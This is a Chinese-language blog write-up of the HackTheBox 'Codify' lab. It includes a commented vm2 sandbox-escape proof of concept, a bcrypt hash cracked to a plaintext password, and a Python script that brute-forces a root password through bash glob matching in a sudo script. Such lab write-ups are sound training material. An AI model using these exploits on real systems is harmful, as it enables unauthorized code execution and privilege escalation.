---
layout: post
title: "HackTheBox - Codify Writeup"
description: 就是靶機WP
date: 2023-11-23 00:00:00 +0800
categories: Writeup 靶機
tags: 滲透測試 HackTheBox
---

## 環境

### 題目

[Hack The Box](https://app.hackthebox.com/machines/Codify)

### 記得連 HTB VPN

### /etc/hosts 設定

![image](https://hackmd.io/_uploads/HkY2CvoSA.png)


## 找服務

有 ssh 連線、Apache 網站、還有一個 Node.js Express

![image](https://hackmd.io/_uploads/ByraCPjBC.png)


### 網站頁面

#### 首頁

說明是一個讓使用者可以跑 JavaScript 程式碼的沙盒環境

![image](https://hackmd.io/_uploads/SJlARvorC.png)


#### 限制

說明禁止以及可使用的東西

child_process 是一個可以讓 Node.js 執行指令的功能

fs 可以對檔案進行讀寫

![image](https://hackmd.io/_uploads/r1R0RDirC.png)

#### 關於

說到了使用 vm2 這個 library 來實作沙盒，版本是 3.9.16

 https://github.com/patriksimek/vm2/releases/tag/3.9.16

![image](https://hackmd.io/_uploads/H1_J1_irR.png)


#### 功能頁面

左側可以輸入 JavaScript 程式碼，按下 Run 後結果會顯示在右側

![image](https://hackmd.io/_uploads/HyylJuiB0.png)


## 找已存在漏洞

Google 看看

![image](https://hackmd.io/_uploads/H1Lg1_jB0.png)


### Sandbox Bypass

漏洞編號：CVE-2023-32314

版本小於 3.6.18 的 vm2 會受影響

![image](https://hackmd.io/_uploads/HypxkOiHR.png)


這個漏洞可以做到vm2沙盒逃逸，也就是說可以允許攻擊者在主機系統上執行任意代碼

繞過沙盒環境的限制。

首先前面兩行是正常的建立 vm 環境

```python
const { VM } = require("vm2");
const vm = new VM();
```

中間這一串

在 const code = ``;  中的內容

是打算要在 vm 內運行的程式碼

```python
const code = `
  const err = new Error();
  err.name = {
    toString: new Proxy(() => "", {
      apply(target, thiz, args) {
        const process = args.constructor.constructor("return process")();
        throw process.mainModule.require("child_process").execSync("echo hacked").toString();
      },
    }),
  };
  try {
    err.stack;
  } catch (stdout) {
    stdout;
  }
`;
```

把中間抓出來看

```python
//定義一個 Error 名為 err
const err = new Error();

//將 err 的 name 屬性設定成 toString 方法（通常應該是字串）
err.name = {
  toString: new Proxy(() => "", { //接著使用 Proxy 來改寫 toString 方法
    apply(target, thiz, args) { //當函數的 () => "" 行為發生時，使用 apply 的內容來取代原本行為
			//還是看不懂 args.constructor.constructor 這鬼東西 
      //不過這時的 process 應該已經是逃離沙盒環境的東西了，因為下一行程式碼可以執行被黑單的 child_process
      const process = args.constructor.constructor("return process")();
			//這一行就是運行惡意行為的動作而已
      throw process.mainModule.require("child_process").execSync("echo hacked").toString();
    },
  }),
};

//嘗試調用 err.stack ，這時會觸發 err.name 被調用
//err.name 被改成 toString 方法
//但 toString 方法又被 Proxy 攔截
//最後執行到了 apply 內的惡意內容
try { 
  err.stack;
} catch (stdout) { //最後透過 catch 來捕捉錯誤訊息回傳，因為 apply 內用到了 throw 來主動拋出錯誤
  stdout;
}
```

最後一行則是正常的運行 vm

就可以將 stdout 的結果印出

```python
console.log(vm.run(code));
```

測試看看，發現可以指令執行成功

右側輸出了 pwd 指令的結果

![image](https://hackmd.io/_uploads/H19-J_sHA.png)


## 橫向移動

看看目前的使用者是誰

![image](https://hackmd.io/_uploads/SkfM1_jr0.png)


雖然現在可以透過 svc 這個使用者下指令

但沒辦法執行 sudo，畢竟不知道這使用者的密碼

所以試著找還有哪些使用者可以下手、還有順便看看能不能翻到目前使用者的資料

看到 /etc/passwd

發現另一個使用者名稱 joshua

![image](https://hackmd.io/_uploads/Hy5zydoS0.png)

```sql
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:113:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
joshua:x:1000:1000:,,,:/home/joshua:/bin/bash
svc:x:1001:1001:,,,:/home/svc:/bin/bash
fwupd-refresh:x:114:122:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```

現在目標有兩個，找是否有 svc 和 joshua 的密碼資訊

翻看看網頁資料夾 /var/www

![image](https://hackmd.io/_uploads/rJI7J_jBC.png)


看到 /var/www/html/index.html

沒啥用的頁面

![image](https://hackmd.io/_uploads/HJAX1OjB0.png)


翻 /var/www/contact

![image](https://hackmd.io/_uploads/HyHNyOoSC.png)


看到一個 .db 檔案，直接印出來是亂碼，不過最前面有寫到格式

SQLite format 3

![截圖 2024-06-16 凌晨3.45.16](https://hackmd.io/_uploads/H1FIJdiSC.png)

Google 了一下找到可以用指令來看裡面的內容

首先看有哪些 table

![image](https://hackmd.io/_uploads/SJFP1OsSR.png)


看看 users 有哪些欄位，發現有 id 使用者名稱和密碼

![image](https://hackmd.io/_uploads/HybukdjB0.png)


直接印出 users 表內所有資料

拿到

使用者名稱：joshua

密碼：一大串，應該是 hash 後的值，但不知道啥格式，問 GPT ，他說是 bcrypt，信他

![image](https://hackmd.io/_uploads/ry5O1usHC.png)

使用 john 做字典攻擊看看，跑了 21 秒就出來了，密碼是 spongebob1

![image](https://hackmd.io/_uploads/rymFk_jSC.png)


拿去嘗試 ssh 登入看看，順利進入

![1718480835263](https://hackmd.io/_uploads/Skep0JusH0.jpg)

拿到第一個 flag

![image](https://hackmd.io/_uploads/Hylikl_oHR.png)


## 提權

sudo -l 看有哪些東西有權限

![image](https://hackmd.io/_uploads/H1KglujrR.png)

發現有某個 .sh 腳本的 root 執行權限

嘗試改寫這腳本看看，不行，權限不足

![image](https://hackmd.io/_uploads/BybZeOjSC.png)

看看這腳本在做啥，有沒有可以利用的地方

簡單來說就是使用 root 用戶去備份資料庫，並且要先輸入正確到 root 密碼才能執行

其中最前面幾行可以看到，有比對密碼的邏輯

他去 /root/.creds 抓取了密碼，用來和使用者的輸入比對

先嘗試 cat /root/.creds，不過權限不足

繼續看看有哪些地方可以下手

後面主要是在做打包資料庫，也沒其他使用者輸入的地方，看起來也沒地方下手

這個腳本我們能控制的只有密碼的輸入

![image](https://hackmd.io/_uploads/Bkj-guoS0.png)

看到密碼比對的邏輯，發現他是直接拿使用者的輸入去比對正確密碼

這表示 $DB_PASS 變數所放的正確密碼應該是明文

<aside>
❓ 不知道有沒有方法可以去提取到 $DB_PASS 變數的內容之類的？

</aside>

![image](https://hackmd.io/_uploads/By17ldsHR.png)

比對密碼的部分，查了一下比對字串的方式有兩種

一種是 [ str1 = str2 ]

一種是 [[ str1 == str2 ]]

![image](https://hackmd.io/_uploads/SyqQx_jH0.png)

發現 [[ str1 == str2 ]] 這種比對形式

可以使用 pattern matching

![image](https://hackmd.io/_uploads/S1N4gdsBC.png)

它可以做到像這樣的比對

![image](https://hackmd.io/_uploads/BJpVx_oH0.png)

先試玩看看

正常比對成功

![image](https://hackmd.io/_uploads/BJHBgujBR.png)

故意讓他比對失敗試試

![image](https://hackmd.io/_uploads/rk1Ue_irC.png)

在剛剛的字串最後加上 * 可以讓字串比對成功

![image](https://hackmd.io/_uploads/HJNtgusrR.png)

這時只要透過改星號的前一個字元，就可以透過比對是否成功

來猜測某一個字元

![image](https://hackmd.io/_uploads/SJzPeOorA.png)

這樣可以大幅減少暴力破解的複雜度

![image](https://hackmd.io/_uploads/H1tPxdsSR.png)


實際測試一下，直接在密碼處輸入一個 *

驗證通過，表示有起作用

接下來就是暴力的測試了，因為剛剛的腳本內也沒有錯誤懲罰之類的

<aside>
❓ 不過在現實的系統中，這樣測試動靜應該算大，如果在現實遇到這種狀況，通常會怎麼做？

</aside>

![image](https://hackmd.io/_uploads/SkAjluir0.png)


寫成腳本

先測試一下，確認有 python 可以用

![image](https://hackmd.io/_uploads/Bk8hgOiHR.png)

快樂的寫程式時間，大概需要幾個步驟

1. 抓出密碼長度
    1. 開啟 .sh 
    2. 輸入密碼
    3. 捕捉訊息
        1. 正確就輸出密碼長度
        2. 錯誤就繼續往下加
2. 暴力破解
    1. 開啟 .sh 
    2. 輸入密碼
    3. 捕捉訊息
        1. 正確就往下嘗試
        2. 錯誤就繼續嘗試其他字元
        3. 直到試到剛剛的密碼長度

```python
import subprocess

def test_pw_len():
    for pw_len in range(30):
        pw = "?" * (pw_len + 1)
        result = subprocess.run(['sudo /opt/scripts/mysql-backup.sh'],shell=True, input=pw, capture_output=True, text=True)
        #print(pw)
        if "Password confirmed!" in result.stdout:
            return pw_len + 1

def guess_password(max_length):
    characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    pw = ''
    for _ in range(max_length):
        for char in characters:
            result = subprocess.run(['sudo /opt/scripts/mysql-backup.sh'],shell=True, input= pw + char + "*", capture_output=True, text=True)
            #print(pw + char + "*")
            if "Password confirmed!" in result.stdout:
                pw = pw + char
                break
    return pw

if __name__ == "__main__":
    max_length = test_pw_len()
    #print("max_length: ", max_length)

    password = guess_password(max_length)
    if password:
        print(f"password :) : {password}")
    else:
        print(" not found :( ")
```

逐個加上問號來嘗試密碼長度

![image](https://hackmd.io/_uploads/SydplusBR.png)


開始嘗試每個密碼正確的字元

![image](https://hackmd.io/_uploads/SJ1AeuiHR.png)

比對到最後找到正確密碼

![image](https://hackmd.io/_uploads/SkPAl_jrR.png)

嘗試拿來登入 root

Done :)

![image](https://hackmd.io/_uploads/SJE1ZdoBR.png)